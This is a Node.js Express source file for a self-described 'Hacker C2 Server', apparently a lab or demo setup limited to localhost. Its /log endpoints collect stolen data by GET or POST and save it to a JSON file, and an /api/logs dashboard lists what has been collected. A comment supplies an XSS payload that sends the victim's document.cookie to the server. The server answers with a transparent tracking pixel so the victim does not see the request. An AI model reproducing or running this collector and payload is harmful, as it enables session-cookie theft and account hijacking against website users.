const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 4000;
const LOG_FILE = path.join(__dirname, 'logs.json');

app.use(cors({
    origin: ['http://localhost:3000', 'http://127.0.0.1:3000'],
    credentials: true
}));
app.use(bodyParser.json());
app.use(express.static('public'));

// Initialize log file
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, JSON.stringify([]));
}

function saveLog(data, sourceIp) {
    const logs = JSON.parse(fs.readFileSync(LOG_FILE));
    logs.push({
        id: Date.now(),
        time: new Date().toISOString(),
        ip: sourceIp,
        data: data
    });
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
}

// 🟢 Endpoints to receive stolen data
// GET: Use with <script>new Image().src = '.../log?data=' + document.cookie</script>
app.get('/log', (req, res) => {
    const data = req.query.data;
    if (data) {
        console.log(`[Hacker] Received data: ${data}`);
        saveLog(data, req.ip);
    }
    // Return a 1x1 transparent pixel to hide the request from the victim
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Content-Length': pixel.length
    });
    res.end(pixel);
});

// POST: Use with fetch or XMLHttpRequest
app.post('/log', (req, res) => {
    const data = req.body.data || JSON.stringify(req.body);
    console.log(`[Hacker] Received POST data: ${data}`);
    saveLog(data, req.ip);
    res.status(200).send('OK');
});

// Admin Dashboard API
app.get('/api/logs', (req, res) => {
    const logs = JSON.parse(fs.readFileSync(LOG_FILE));
    res.json(logs.reverse());
});

app.listen(PORT, () => {
    console.log(`\n😈 Hacker C2 Server running at http://localhost:${PORT}`);
    console.log(`📡 Log endpoints:`);
    console.log(`   - GET  http://localhost:${PORT}/log?data=...`);
    console.log(`   - POST http://localhost:${PORT}/log\n`);
});
